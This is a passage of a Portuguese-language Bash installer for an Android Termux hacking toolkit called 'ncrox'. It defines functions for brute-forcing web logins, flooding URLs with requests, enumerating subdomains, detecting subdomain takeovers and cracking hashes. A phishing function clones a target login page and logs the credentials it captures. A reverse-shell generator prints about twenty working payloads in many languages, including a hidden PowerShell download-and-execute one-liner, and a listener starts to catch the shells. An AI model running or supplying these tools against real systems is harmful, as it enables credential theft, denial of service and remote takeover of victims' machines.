  { [ -z "$url" ] || [ -z "$uf" ] || [ -z "$pf" ]; } && { echo "uso: ncx-brute <url> <campo_user> <campo_pass> [-u users] [-p passes]"; return 1; }
  _tag "ncx-brute :: $url :: campo $uf/$pf :: ${thr} threads"
  _brute_one(){
    local url="$1" uf="$2" pf="$3" u="$4" p="$5" ok="$6" fail="$7" okc="$8"
    local out body code len hit=0
    out=$(curl -s -m 12 -w '\n%{http_code} %{size_download}' -d "$uf=$u&$pf=$p" "$url")
    code=$(printf '%s' "$out" | tail -1 | awk '{print $1}'); len=$(printf '%s' "$out" | tail -1 | awk '{print $2}')
    body=$(printf '%s' "$out" | sed '$d')
    [ -n "$okc" ] && [ "$code" = "$okc" ] && hit=1
    [ -n "$ok" ] && printf '%s' "$body" | grep -qiF -- "$ok" && hit=1
    [ -n "$fail" ] && printf '%s' "$body" | grep -qiF -- "$fail" && hit=0
    if [ "$hit" = 1 ]; then
      printf '%s[OK]%s %s : %s   (code %s, %s bytes)\n' "$G" "$R" "$u" "$p" "$code" "$len"
    else
      printf '%s[--]%s %s : %s   (code %s, %s bytes)\n' "$D" "$R" "$u" "$p" "$code" "$len"
    fi
  }
  { if [ -n "$ul" ]; then f=$(_wl_path "$ul") && _wl_read "$f" || _def_users; else
      if f=$(_wl_path users); then _wl_read "$f"; else _def_users; fi; fi; } > /tmp/.ncx_u.$$
  { if [ -n "$pl" ]; then f=$(_wl_path "$pl") && _wl_read "$f" || _def_pass; else
      if f=$(_wl_path 10k); then _wl_read "$f"; else _def_pass; fi; fi; } > /tmp/.ncx_p.$$
  while read -r u; do
    [ -z "$u" ] && continue
    while read -r p; do
      [ -z "$p" ] && continue
      _brute_one "$url" "$uf" "$pf" "$u" "$p" "$ok" "$fail" "$okc" &
      n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
    done < /tmp/.ncx_p.$$
  done < /tmp/.ncx_u.$$
  wait 2>/dev/null; rm -f /tmp/.ncx_u.$$ /tmp/.ncx_p.$$
  _hr; echo "concluído"
}
ncx_flood(){
  local url="" conc=50 total=500 m=GET t0 t1 i
  while [ $# -gt 0 ]; do case "$1" in
    -c) conc="$2"; shift 2;; -n) total="$2"; shift 2;; -m) m="$2"; shift 2;;
    -h|--help) echo "uso: ncx-flood <url> [-c concorrencia] [-n total] [-m GET|POST]"; return 0;;
    *) url="$1"; shift;; esac; done
  [ -z "$url" ] && { echo "uso: ncx-flood <url> [-c 50] [-n 500]"; return 1; }
  _tag "ncx-flood :: $url :: $total req / $conc conc"
  t0=$(date +%s.%N)
  for i in $(seq 1 "$total"); do
    curl -s -o /dev/null -m 15 -X "$m" -w '%{http_code}\n' "$url" &
    if [ $((i % conc)) -eq 0 ]; then wait; fi
  done
  wait 2>/dev/null
  t1=$(date +%s.%N)
  awk -v t="$t0" -v e="$t1" -v n="$total" 'BEGIN{d=e-t; printf "%.1f req/s em %.2fs\n", n/d, d}'
  _hr
}
_def_sub(){ printf '%s\n' www mail ftp dev api staging admin blog shop cdn vpn portal app teste test \
  beta ns1 ns2 db git jenkins grafana status docs; }
ncx_sub(){
  local dom="" wl="" thr=30 n=0 w f
  while [ $# -gt 0 ]; do case "$1" in
    -w) wl="$2"; shift 2;; -t) thr="$2"; shift 2;; *) dom="$1"; shift;; esac; done
  [ -z "$dom" ] && { echo "uso: ncx-sub <dominio> [-w lista]"; return 1; }
  _tag "ncx-sub :: $dom"
  _sub_one(){ local ip; ip=$(getent hosts "$1.$2" 2>/dev/null | awk 'NR==1{print $1}'); \
    [ -n "$ip" ] && printf '%s[+]%s %s.%s -> %s\n' "$G" "$R" "$1" "$2" "$ip"; }
  { if [ -n "$wl" ]; then f=$(_wl_path "$wl") && _wl_read "$f" || _def_sub; else
      if f=$(_wl_path dns5000); then _wl_read "$f"; else _def_sub; fi; fi; } | while read -r w; do
    [ -z "$w" ] && continue
    _sub_one "$w" "$dom" &
    n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
  done
  wait 2>/dev/null; _hr
}

# ---------- takeover ----------
_tk_fp(){
  cat <<'F'
github.io|There isn't a GitHub Pages site here
github.com|There isn't a GitHub Pages site here
herokuapp.com|No such app
s3.amazonaws.com|NoSuchBucket
cloudfront.net|Bad request
netlify.app|Not Found - Request ID
netlify.com|Not Found - Request ID
azurewebsites.net|404 Web Site not found
cloudapp.azure.com|404 Web Site not found
trafficmanager.net|404 Web Site not found
cloudapp.net|404 Web Site not found
shopify.com|Sorry, this shop is currently unavailable
myshopify.com|Sorry, this shop is currently unavailable
ghost.io|Domain error
surge.sh|project not found
bitbucket.io|Repository not found
readme.io|Project doesnt exist
zendesk.com|Help Center Closed
statuspage.io|Page Not Found
pantheonsite.io|404 error unknown site
fastly.net|Fastly error: unknown domain
desk.com|Sorry, this page is no longer available
wordpress.com|doesn't exist
tumblr.com|There's nothing here
F
}
ncx_takeover(){
  local dom="" wl="" thr=20 n=0 w f
  while [ $# -gt 0 ]; do case "$1" in
    -w) wl="$2"; shift 2;; -t) thr="$2"; shift 2;;
    -h|--help) echo "uso: ncx-takeover <dominio> [-w lista] [-t threads]"; return 0;;
    *) dom="$1"; shift;; esac; done
  [ -z "$dom" ] && { echo "uso: ncx-takeover <dominio> [-w lista]"; return 1; }
  _tag "ncx-takeover :: $dom"
  _tk_one(){
    local sub="$1" dom="$2" fps="$3" fqdn="$sub.$dom" cn svc sig body
    cn=$(dig +short CNAME "$fqdn" 2>/dev/null | head -1)
    [ -z "$cn" ] && return 0
    while IFS='|' read -r svc sig; do
      case "$cn" in *"$svc"*)
        body=$(curl -sL -m 10 -A 'Mozilla/5.0' "http://$fqdn" 2>/dev/null; curl -sL -m 10 -A 'Mozilla/5.0' "https://$fqdn" 2>/dev/null)
        if printf '%s' "$body" | grep -qF -- "$sig"; then
          printf '%s[VULN]%s %s -> %s  (%s · assinatura confirmada)\n' "$RD" "$R" "$fqdn" "$cn" "$svc"
        else
          printf '%s[SUSP]%s %s -> %s  (%s · sem assinatura)\n' "$Y" "$R" "$fqdn" "$cn" "$svc"
        fi
        return 0 ;;
      esac
    done <<< "$fps" ;;
  }
  local fps; fps=$(_tk_fp)
  { if [ -n "$wl" ]; then f=$(_wl_path "$wl") && _wl_read "$f" || _def_sub; else
      if f=$(_wl_path dns5000); then _wl_read "$f"; else _def_sub; fi; fi; } | while read -r w; do
    [ -z "$w" ] && continue
    _tk_one "$w" "$dom" "$fps" &
    n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
  done
  wait 2>/dev/null; _hr
}

# ---------- crack ----------
ncx_crack(){
  local h="" wl="" rules="cdsl" thr=0 f
  while [ $# -gt 0 ]; do case "$1" in
    -w) wl="$2"; shift 2;; -r) rules="$2"; shift 2;; -t) thr="$2"; shift 2;;
    -h|--help) echo "uso: ncx-crack <hash> [-w lista] [-r regras] [-t processos]"; \
               echo "regras: c=caixa d=dígitos/anos l=leet s=sufixos (padrão cdsl)"; return 0;;
    *) h="$1"; shift;; esac; done
  [ -z "$h" ] && { echo "uso: ncx-crack <hash> [-w lista]"; return 1; }
  _tag "ncx-crack :: ${h:0:24}…"
  if [ -n "$wl" ]; then
    f=$(_wl_path "$wl") || { echo "lista não encontrada: $wl"; return 1; }
    _wl_read "$f" | python3 "$HOME/.ncrox/tools/crack.py" "$h" -r "$rules" -t "$thr"
  else
    if f=$(_wl_path 10k); then _wl_read "$f"; else _def_pass; fi \
      | python3 "$HOME/.ncrox/tools/crack.py" "$h" -r "$rules" -t "$thr"
  fi
  _hr
}

# ---------- phish ----------
ncx_phish(){
  local port="" url="" title="Acesso restrito" dest="" tpl="" ip
  while [ $# -gt 0 ]; do case "$1" in
    -t) title="$2"; shift 2;; -d) dest="$2"; shift 2;; -r) tpl="$2"; shift 2;;
    -h|--help) echo "uso: ncx-phish <porta> [url_alvo] [-t titulo] [-d destino] [-r template]"; return 0;;
    *) if [ -z "$port" ]; then port="$1"; else url="$1"; fi; shift;; esac; done
  [ -z "$port" ] && { echo "uso: ncx-phish <porta> [url_alvo]"; return 1; }
  local dir="$HACK_DIR/phish"; mkdir -p "$dir"
  local page="$dir/page.html" log="$dir/capturas.log"
  : > "$page"
  _tag "ncx-phish :: :$port${url:+ :: $url}"
  if [ -n "$tpl" ] && [ -f "$tpl" ]; then
    cp "$tpl" "$page"; echo "  template: $tpl"
  elif [ -n "$url" ]; then
    if curl -fsSL -m 20 -A 'Mozilla/5.0 (Linux; Android 13)' "$url" -o "$page"; then
      sed -i -E 's/action="[^"]*"/action="\/"/Ig; s/(<form[^>]*)method="[^"]*"/\1method="POST"/Ig' "$page"
      grep -qi '<form' "$page" || printf '  %s[!]%s nenhum <form> no alvo — ajuste com -r\n' "$RD" "$R"
      [ -z "$dest" ] && dest="$url"
      echo "  página clonada ($(stat -c%s "$page") bytes)"
    else
      rm -f "$page"; printf '  %s[!]%s falhou baixar alvo — usando template embutido\n' "$RD" "$R"
    fi
  fi
  ip=$(_myip)
  echo "  login:  http://${ip:-SEU_IP}:$port"
  echo "  painel: http://${ip:-SEU_IP}:$port/_capturas"
  echo "  log:    $log"
  [ -n "$dest" ] && echo "  redireciona para: $dest"
  _hr
  PHISH_TITLE="$title" python3 "$HOME/.ncrox/tools/phish.py" "$port" "$page" "$dest" "$log"
}

# ---------- reverse shell ----------
_myip(){
  local i
  i=$(ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}')
  [ -z "$i" ] && i=$(ifconfig 2>/dev/null | grep -oE 'inet [0-9.]+' | awk '{print $2}' | grep -v '^127\.' | head -1)
  printf '%s' "${i:-}"
}
_listen(){
  local port="$1" wrap=""
  command -v rlwrap >/dev/null 2>&1 && wrap="rlwrap -cAr "
  _tag "listener :: 0.0.0.0:$port"
  if command -v ncat >/dev/null 2>&1; then exec ${wrap}ncat -lvnp "$port"
  elif nc -h 2>&1 | grep -q -- '-p'; then exec ${wrap}nc -lvnp "$port"
  elif command -v nc >/dev/null 2>&1; then exec ${wrap}nc -l -p "$port"
  else echo "nenhum nc/ncat instalado — pkg install netcat-openbsd"; fi
}
ncx_listen(){ [ -z "${1:-}" ] && { echo "uso: ncx-listen <porta>"; return 1; }; _listen "$1"; }

_p(){
  local n="$1" pl="$2"
  [ -n "$ONLY" ] && [ "$ONLY" != "$n" ] && return 0
  [ "$URLENC" = 1 ] && pl=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$pl")
  [ "$B64" = 1 ] && pl=$(printf '%s' "$pl" | base64 -w0)
  printf '%s[%s]%s\n%s\n\n' "$O" "$n" "$R" "$pl"
  EMIT=$((EMIT+1))
}
ncx_rev(){
  local lhost="" lport="" det=0 LISTEN=0
  ONLY=""; URLENC=0; B64=0; EMIT=0
  while [ $# -gt 0 ]; do case "$1" in
    -t) ONLY="$2"; shift 2;; -a) ONLY=""; shift;; -u) URLENC=1; shift;;
    -b) B64=1; shift;; -i) det=1; shift;; -l) LISTEN=1; shift;;
    -h|--help) echo "uso: ncx-rev <lhost|-> <lport> [-t tipo] [-a] [-u] [-b] [-i] [-l]"; \
               echo "tipos: bash sh bash196 nc nc-mkfifo ncat socat python3 python2 perl php ruby node awk telnet xterm lua java powershell powershell-b64 golang"; return 0;;
    *) if [ -z "$lhost" ]; then lhost="$1"; else lport="$1"; fi; shift;; esac; done
  [ -z "$lport" ] && { echo "uso: ncx-rev <lhost|-> <lport> [-t tipo]"; return 1; }
  case "$lport" in ''|*[!0-9]*) echo "porta inválida"; return 1;; esac
  { [ "$lport" -lt 1 ] || [ "$lport" -gt 65535 ]; } && { echo "porta fora de 1-65535"; return 1; }
  [ "$lhost" = "-" ] && det=1
  [ "$det" = 1 ] && lhost=$(_myip)
  [ -z "$lhost" ] && { echo "não detectei IP — informe manualmente"; return 1; }
  _tag "ncx-rev :: $lhost:$lport"

  _p bash        "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
  _p sh          "sh -i >& /dev/tcp/$lhost/$lport 0>&1"
  _p bash196     "0<&196;exec 196<>/dev/tcp/$lhost/$lport; sh <&196 >&196 2>&196"
  _p nc          "nc $lhost $lport -e /bin/sh"
  _p nc-mkfifo   "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $lhost $lport > /tmp/f"
  _p ncat        "ncat $lhost $lport -e /bin/bash --ssl"
  _p socat       "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport"
  _p python3     "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  _p python2     "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
  _p perl        "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
  _p php         "php -r '\$s=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
  _p ruby        "ruby -rsocket -e 'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
  _p node        "node -e \"var n=require('net'),c=require('child_process'),s=c.spawn('sh',[],{stdio:['pipe','pipe','pipe']}),k=new n.Socket();k.connect($lport,'$lhost',()=>{k.pipe(s.stdin);s.stdout.pipe(k);s.stderr.pipe(k)})\""
  _p awk         "awk 'BEGIN{s=\"/inet/tcp/0/$lhost/$lport\";while(1){do{s|getline l;printf \"%s\\n\",l|s}while(l!=\"exit\");close(s)}}'"
  _p telnet      "telnet $lhost $lport | /bin/sh | telnet $lhost $lport"
  _p xterm       "xterm -display $lhost:1"
  _p lua         "lua -e \"require('socket');local s=require('socket').tcp();s:connect('$lhost',$lport);os.execute('/bin/sh -i <&'..s:getfd()..' >&'..s:getfd()..' 2>&'..s:getfd())\""
  _p java        "Runtime r=Runtime.getRuntime();Process p=r.exec(new String[]{\"bash\",\"-c\",\"bash -i >& /dev/tcp/$lhost/$lport 0>&1\"});p.waitFor();"
  _p powershell  "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\\\$c=New-Object Net.Sockets.TCPClient('$lhost',$lport);\\\$s=\\\$c.GetStream();[byte[]]\\\$b=0..65535|%{0};while((\\\$i=\\\$s.Read(\\\$b,0,\\\$b.Length)) -ne 0){;\\\$d=(New-Object Text.ASCIIEncoding).GetString(\\\$b,0,\\\$i);\\\$o=(iex \\\$d 2>&1|Out-String);\\\$s.Write(([Text.Encoding]::ASCII).GetBytes(\\\$o),0,\\\$o.Length)}\""
  _p powershell-b64 "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc $(printf "IEX (New-Object Net.WebClient).DownloadString('http://%s/rev.ps1')" "$lhost" | iconv -t UTF-16LE | base64 -w0)"
  _p golang      "echo 'package main;import(\"os\";\"net\");func main(){c,_:=net.Dial(\"tcp\",\"$lhost:$lport\");go func(){b:=make([]byte,1024);for{n,_:=c.Read(b);os.Stdout.Write(b[:n])}}();b:=make([]byte,1024);for{n,_:=os.Stdin.Read(b);c.Write(b[:n])}}' > /tmp/r.go && go run /tmp/r.go"

  [ "$EMIT" = 0 ] && { printf '%s[!]%s tipo desconhecido: %s\n' "$RD" "$R" "$ONLY"; return 1; }
  printf '%slistener:%s ncx-listen %s%s\n' "$D" "$R" "$lport" "$R"
  if [ "$LISTEN" = 1 ]; then _hr; _listen "$lport"; fi
}

# ---------- utilitários ----------
ncx_hash(){ [ -f "${1:-}" ] && sha256sum "$1" || echo "uso: hash <arquivo>"; }
ncx_base64(){ case "${1:-}" in enc) printf '%s' "${2:-}" | base64 -w0; echo;; dec) printf '%s' "${2:-}" | base64 -d; echo;; *) echo "uso: base64 enc|dec <texto>";; esac; }
ncx_urlinfo(){ [ -z "${1:-}" ] && return 1; python3 -c "import sys,urllib.parse as u;p=u.urlparse(sys.argv[1]);[print(f'{k:8}: {v}') for k,v in [('esquema',p.scheme),('host',p.netloc),('caminho',p.path),('query',p.query)]]" "$1" 2>/dev/null; }
ncx_jsoncheck(){ python3 -c "import json,sys;json.load(open(sys.argv[1],encoding='utf-8'));print('JSON válido')" "${1:-}" 2>/dev/null || echo "JSON inválido"; }
ncx_comparar(){ sha256sum "${1:-}" "${2:-}" 2>/dev/null | awk '{print $1}' | uniq -c | awk '{print ($1==2)?"iguais":"diferentes"}'; }
ncx_fileinfo(){ [ -e "${1:-}" ] && ls -l --time-style=long-iso "$1" && file "$1" 2>/dev/null || echo "não existe"; }
ncx_uuid(){ cat /proc/sys/kernel/random/uuid; }
ncx_netcheck(){ timeout 3 bash -c "exec 3<>/dev/tcp/${1:-}/${2:-80}" 2>/dev/null && echo "porta aberta" || echo "fechada/timeout"; }
ncx_sysinfo(){ echo "sistema: $(uname -srm)"; echo "host: $(uname -n)"; echo "shell: $BASH_VERSION"; echo "pwd: $PWD"; }
ncx_disk(){ df -h "${1:-$HOME}"; }
ncx_which(){ command -v "$@" 2>/dev/null || echo "não encontrado"; }
ncx_where(){ for x in "$@"; do printf '%s: %s\n' "$x" "$(command -v "$x" || echo '-')"; done; }
ncx_findtext(){ [ $# -lt 2 ] && return 1; grep -nF -- "$1" "$2" | head -1000; }
ncx_rede(){ python3 -c "import ipaddress,sys;n=ipaddress.ip_network(sys.argv[1],strict=False);print('rede:',n.network_address,'/ máscara:',n.netmask,'/ broadcast:',n.broadcast_address,'/ hosts:',max(n.num_addresses-2,0))" "${1:-}" 2>/dev/null; }
ncx_tree(){ find "${1:-.}" -maxdepth 3 -printf '%p\n' 2>/dev/null | head -300; }
ncx_readmd(){ [ -f "${1:-}" ] && sed 's/[*_`#]//g' "$1" | head -200; }
ncx_device(){ echo "modelo: $(getprop ro.product.model)"; echo "android: $(getprop ro.build.version.release)"; echo "abi: $(getprop ro.product.cpu.abi)"; }
ncx_battery(){ dumpsys battery 2>/dev/null | grep -E 'level|status|temperature' | sed 's/^ *//'; }
ncx_storage(){ df -h /data 2>/dev/null | tail -1; }
ncx_screen(){ wm size 2>/dev/null; wm density 2>/dev/null; }
ncx_uptime(){ awk '{printf "%.0f min\n", $1/60}' /proc/uptime; }
ncx_locale(){ getprop persist.sys.locale; }
ncx_timezone(){ date +%Z; }
ncx_volume(){ command -v termux-volume >/dev/null && termux-volume || echo "requer termux-api"; }
ncx_ringer(){ settings get global ringer_mode 2>/dev/null || echo "indisponível"; }
ncx_say(){ termux-tts-speak "${*:-}" 2>/dev/null || echo "requer termux-api"; }
ncx_open(){ termux-open "$1" 2>/dev/null || am start -a android.intent.action.VIEW -d "$1" 2>/dev/null || echo "$1"; }
ncx_pack(){ case "${1:-search}" in search) pkg search "${2:-}";; show) pkg show "${2:-}";; *) pkg "${@}";; esac; }
ncx_docs(){ find "$HOME/storage/shared" -maxdepth 4 -iname "*.${1:-pdf}" 2>/dev/null | head -100; }
ncx_applist(){ pm list packages -3 2>/dev/null | sed 's/package://' | head -200; }
ncx_tasklist(){ ps -A -o pid,comm 2>/dev/null | head -60; }
ncx_settings(){ echo "tema: ncrox/azul-laranja"; echo "prompt: satanachia λ"; echo "motd: ativo"; echo "wordlists: $WL_DIR"; echo "nhack: $HACK_DIR"; }

ncx_dispatch(){
  local c="${1:-help}"; shift 2>/dev/null
  case "$c" in
    help|ajuda) ncx_help;;
    vigia) ncx_vigia "$@";; oraculo) ncx_oraculo "$@";; bastiao) ncx_bastiao "$@";; selo) ncx_selo "$@";;
    search) ncx_search "$@";; web) ncx_web "$@";; dns) ncx_dns "$@";; whois) ncx_whois "$@";;
    net|ip) ncx_net "$@";; github) ncx_github "$@";; ondeuto) ncx_ondeuto "$@";;
    hack|nhack) ncx_nhack "$@";;
    port|ncx-port) ncx_port "$@";; dir|ncx-dir) ncx_dir "$@";;
    brute|ncx-brute) ncx_brute "$@";; flood|ncx-flood) ncx_flood "$@";; sub|ncx-sub) ncx_sub "$@";;
    takeover|ncx-takeover) ncx_takeover "$@";; crack|ncx-crack) ncx_crack "$@";; phish|ncx-phish) ncx_phish "$@";;
    rev|ncx-rev) ncx_rev "$@";; listen|ncx-listen) ncx_listen "$@";;
    wl|wordlists|ncx-wordlists) ncx_wordlists "$@";;
    hash) ncx_hash "$@";; base64) ncx_base64 "$@";; urlinfo) ncx_urlinfo "$@";; jsoncheck) ncx_jsoncheck "$@";;
    comparar) ncx_comparar "$@";; fileinfo) ncx_fileinfo "$@";; uuid) ncx_uuid;; netcheck) ncx_netcheck "$@";;
    sysinfo) ncx_sysinfo;; disk) ncx_disk "$@";; which) ncx_which "$@";; where) ncx_where "$@";;
    findtext) ncx_findtext "$@";; rede) ncx_rede "$@";; tree) ncx_tree "$@";; readmd) ncx_readmd "$@";;
    device) ncx_device;; battery) ncx_battery;; storage) ncx_storage;; screen) ncx_screen;; uptime) ncx_uptime;;
    locale) ncx_locale;; timezone) ncx_timezone;; volume) ncx_volume;; ringer) ncx_ringer;; say) ncx_say "$@";;
    open) ncx_open "$@";; pack|pkg) ncx_pack "$@";; docs) ncx_docs "$@";; applist) ncx_applist;;
    tasklist) ncx_tasklist;; settings) ncx_settings;;
    *) if command -v "$c" >/dev/null 2>&1; then "$c" "$@"; else printf 'desconhecido: %s\n' "$c"; ncx_help; fi;;
  esac
}
LIBEOF
  chmod +x "$LIB"
  printf '%s[+]%s biblioteca instalada\n' "$G" "$R"
}

write_bins() {
  mkdir -p "$BIN"
  cat > "$BIN/ncrox" <<'EOF'
#!/usr/bin/env bash
export NCROX_HOME="$HOME/.ncrox"
source "$NCROX_HOME/lib/ncrox_lib.sh"
case "${1:-}" in
  ""|-i|--interactive)
    ncx_banner
    if [ -f "$NCROX_HOME/src/satanachia.py" ] && command -v python3 >/dev/null 2>&1; then
      printf '%smodo: ncrox nativo (python). "exit" encerra.%s\n\n' "$D" "$R"
      cd "$NCROX_HOME/src" && exec python3 satanachia.py
    else
      printf '%smodo: réplica (fonte ncrox ausente)%s\n\n' "$D" "$R"; ncx_help
    fi ;;
  for)
    shift; case "${1:-hack}" in hack) shift;; esac
    ncx_dispatch nhack "$@" ;;
  -r|--replica) ncx_banner; ncx_help ;;
  -update) exec ncrox-update ;;
  -restore) exec ncrox-restore ;;
  *) ncx_dispatch "$@" ;;
esac
EOF
  cat > "$BIN/ncrox-update" <<'EOF'
#!/usr/bin/env bash
[ -d "$HOME/.ncrox/src/.git" ] || { echo "sem fonte clonada"; exit 1; }
git -C "$HOME/.ncrox/src" pull --ff-only && echo "ncrox atualizado"
EOF
  cat > "$BIN/ncrox-restore" <<'EOF'
#!/usr/bin/env bash
H="$HOME/.ncrox"
for f in "$H/backup/.bashrc" "$H/backup/colors.properties" "$H/backup/termux.properties" "$H/backup/motd"; do
  [ -f "$f" ] || continue
  case "$f" in
    */.bashrc) cp "$f" "$HOME/.bashrc" ;;
    *colors.properties|*termux.properties) cp "$f" "$HOME/.termux/$(basename "$f")" ;;
    *motd) cp "$f" "${PREFIX}/etc/motd" ;;
  esac
done
sed -i "/# >>> ncrox prompt >>>/,/# <<< ncrox prompt <<</d" "$HOME/.bashrc" 2>/dev/null
rm -f "$PREFIX/bin/ncrox" "$PREFIX/bin/ncrox-update" "$PREFIX/bin/ncrox-restore" "$PREFIX/bin/ncx-"* "$PREFIX/bin/nhack"
termux-reload-settings 2>/dev/null
echo "ncrox removido do shell. Fontes, wordlists e nhack mantidos em ~/.ncrox"
EOF
  local t
  for t in port dir brute flood sub rev listen wordlists takeover crack phish; do
    cat > "$BIN/ncx-$t" <<EOF
#!/usr/bin/env bash
source "\$HOME/.ncrox/lib/ncrox_lib.sh"
ncx_$t "\$@"
EOF
  done
  cat > "$BIN/nhack" <<'EOF'
#!/usr/bin/env bash
source "$HOME/.ncrox/lib/ncrox_lib.sh"
ncx_nhack "$@"
EOF
  chmod +x "$BIN"/ncrox "$BIN"/ncrox-update "$BIN"/ncrox-restore "$BIN"/ncx-* "$BIN"/nhack
  printf '%s[+]%s launchers em %s\n' "$G" "$R" "$BIN"
}

write_prompt() {
  mkdir -p "$BK"; [ -f "$HOME/.bashrc" ] && cp "$HOME/.bashrc" "$BK/.bashrc"
  sed -i "/# >>> ncrox prompt >>>/,/# <<< ncrox prompt <<</d" "$HOME/.bashrc" 2>/dev/null
  cat >> "$HOME/.bashrc" <<'EOF'

# >>> ncrox prompt >>>
export NCROX_HOME="$HOME/.ncrox"
PS1='\[\e[38;2;255;122;0m\]┌─[\[\e[38;2;30;144;255m\]satanachia\[\e[38;2;255;122;0m\]]─[\[\e[38;2;30;144;255m\]\w\[\e[38;2;255;122;0m\]]\n└─\[\e[38;2;30;144;255m\]λ\[\e[0m\] '
PROMPT_COMMAND='printf "\033]0;satanachia :: %s\007" "${PWD##*/}"'
# <<< ncrox prompt <<<
EOF
  printf '%s[+]%s prompt aplicado\n' "$G" "$R"
}

write_motd() {
  [ -f "$PREFIX/etc/motd" ] && cp "$PREFIX/etc/motd" "$BK/motd"
  {
    printf '\n%s%s%s\n' "$O" "$ART" "$R"
    printf '%s   s a t a n a c h i a  ·  n c r o x  ·  t e r m u x%s\n' "$B" "$R"
    printf '%s   ──────────────────────────────────────────────%s\n' "$D" "$R"
    printf '%s   %s@%s  ·  %s%s\n' "$D" "$(whoami)" "$(uname -n)" "$(date '+%d/%m %H:%M')" "$R"
    printf '%s   ncrox          ambiente ncrox (REPL nativo)%s\n' "$D" "$R"
    printf '%s   ncrox help     comandos disponíveis%s\n' "$D" "$R"
    printf '%s   ncrox for hack arsenal nhack (github)%s\n' "$D" "$R"
    printf '%s   ncx-port · ncx-dir · ncx-brute · ncx-flood%s\n' "$D" "$R"
    printf '%s   ncx-rev · ncx-phish · ncx-crack · ncx-takeover%s\n' "$D" "$R"
    printf '%s   ──────────────────────────────────────────────%s\n\n' "$D" "$R"
  } > "$PREFIX/etc/motd"
  printf '%s[+]%s tela de entrada reescrita\n' "$G" "$R"
}

write_colors() {
  mkdir -p "$HOME/.termux"
  [ -f "$HOME/.termux/colors.properties" ] && cp "$HOME/.termux/colors.properties" "$BK/colors.properties"
  cat > "$HOME/.termux/colors.properties" <<'EOF'
background=#08080C
foreground=#D7DCE5
cursor=#FF7A00
color0=#08080C
color1=#FF4D4D
color2=#3DDC84
color3=#FF7A00
color4=#1E90FF
color5=#B388FF
color6=#29B6F6
color7=#C7CCD6
color8=#5A5F6B
color9=#FF6B6B
color10=#69F0AE
color11=#FFA040
color12=#64B5F6
color13=#CE93D8
color14=#4DD0E1
color15=#FFFFFF
EOF
  printf '%s[+]%s paleta ncrox aplicada\n' "$G" "$R"
}

write_keys() {
  [ -f "$HOME/.termux/termux.properties" ] && cp "$HOME/.termux/termux.properties" "$BK/termux.properties"
  if ! grep -q '^extra-keys' "$HOME/.termux/termux.properties" 2>/dev/null; then
    printf '\nextra-keys = [[\x27ESC\x27,\x27/\x27,\x27-\x27,\x27HOME\x27,\x27UP\x27,\x27END\x27,\x27PGUP\x27],[\x27TAB\x27,\x27CTRL\x27,\x27ALT\x27,\x27LEFT\x27,\x27DOWN\x27,\x27RIGHT\x27,\x27PGDN\x27]]\n' \
      >> "$HOME/.termux/termux.properties"
  fi
  printf '%s[+]%s teclas extras configuradas\n' "$G" "$R"
}

install() {
  need_termux
  banner
  mkdir -p "$NCROX_HOME" "$BK" "$HACK_DIR" 2>/dev/null || mkdir -p "$NCROX_HOME" "$BK"
  deps
  fetch_ncrox
  write_hacktools
  write_lib
  write_bins
  write_prompt
  write_motd
  write_colors
  write_keys
  printf '\n%s[*]%s baixando wordlists base (common, dns5000, 10k, users, pass-short)...\n' "$B" "$R"
  source "$LIB"; ncx_wordlists auto
  termux-reload-settings 2>/dev/null || true
  printf '\n%s[+] instalação concluída%s\n' "$G" "$R"
  printf '%s    feche e reabra o Termux — ou rode: exec bash -l%s\n\n' "$D" "$R"
  printf '%s    ncrox for hack | ncx-phish 8080 https://alvo/login | ncx-rev - 4444 -l%s\n\n' "$D" "$R"
  printf '%s    ncx-wordlists rockyou   (opcional, ~300 MB)%s\n\n' "$D" "$R"
}

case "${1:-install}" in
  install|"") install ;;
  update) exec "$BIN/ncrox-update" ;;
  restore) exec "$BIN/ncrox-restore" ;;
  banner) banner ;;
  *) echo "uso: bash ncrox.sh [install|update|restore|banner]" ;;
esac
